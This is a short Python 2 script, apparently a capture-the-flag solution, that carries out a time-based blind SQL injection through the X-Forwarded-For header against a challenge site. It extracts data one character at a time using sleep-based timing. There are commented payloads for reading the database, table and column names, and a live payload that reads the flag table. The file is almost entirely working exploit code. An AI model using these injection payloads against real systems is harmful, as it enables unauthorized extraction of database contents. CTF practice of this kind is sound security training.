#coding:utf-8
"""
@author: seck
"""
import requests
import time
maystr="0987654321qwertyuiopasdfghjklzxcvbnm."
flag=''
for j in range(33):

    for i in maystr:
        url="http://ctf5.shiyanbar.com/web/wonderkun/index.php"
        header={
            # "X-Forwarded-For":"' +(select case when (substring((select database())from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑数据库的名字
            #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑表明
            #"X-Forwarded-For":"' +(select case when (substring((select(select(group_concat(column_name))from(information_schema.columns)where(table_name=0x666C6167))) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i) #跑字段名
            "X-Forwarded-For":"' +(select case when (substring((select flag from flag) from %s for 1)='%s') then sleep(5) else 0 end) and 'Zkkp'='Zkkp" % (j,i)  #跑记录
        }
        start_time = time.time()
        res=requests.get(url, headers=header,timeout=10).text
        print ".",
        if time.time()-start_time>4:
            flag+=i
            print flag
        # print res